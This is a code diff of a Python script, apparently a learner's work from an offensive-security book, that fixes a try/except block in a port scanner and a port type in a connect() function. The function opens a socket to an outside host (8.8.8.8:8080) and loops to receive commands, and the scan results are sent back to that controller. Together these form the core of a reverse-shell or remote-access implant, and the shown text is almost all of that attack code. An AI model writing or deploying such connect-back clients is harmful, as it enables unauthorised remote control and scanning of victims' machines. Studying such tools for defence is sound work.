@@ -22,25 +22,26 @@ def transfer(s, path):
 def scanner(s, ip, ports):
     scan_result = ''
     for port in ports.split(','):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        output = sock.connect_ex((ip, int(port)))
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            output = sock.connect_ex((ip, int(port)))
 
-        if output == 0:
-            scan_result += "[+] Port " + port + " is open.\n"
-        else:
-            scan_result += "[-] Port " + port + " is closed or unreachable.\n"
+            if output == 0:
+                scan_result += "[+] Port " + port + " is open.\n"
+            else:
+                scan_result += "[-] Port " + port + " is closed or unreachable.\n"
 
-        sock.close()
+            sock.close()
 
-    except Exception as e:
-        pass
+        except Exception as e:
+            pass
 
     s.send(scan_result)
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # I'm guessing the whole chapter before was setting this up to send to a central box, will need to refactor to run locally
-    s.connect(('8.8.8.8', '8080'))
+    s.connect(('8.8.8.8', 8080))
 
     while True:
         #1024 again
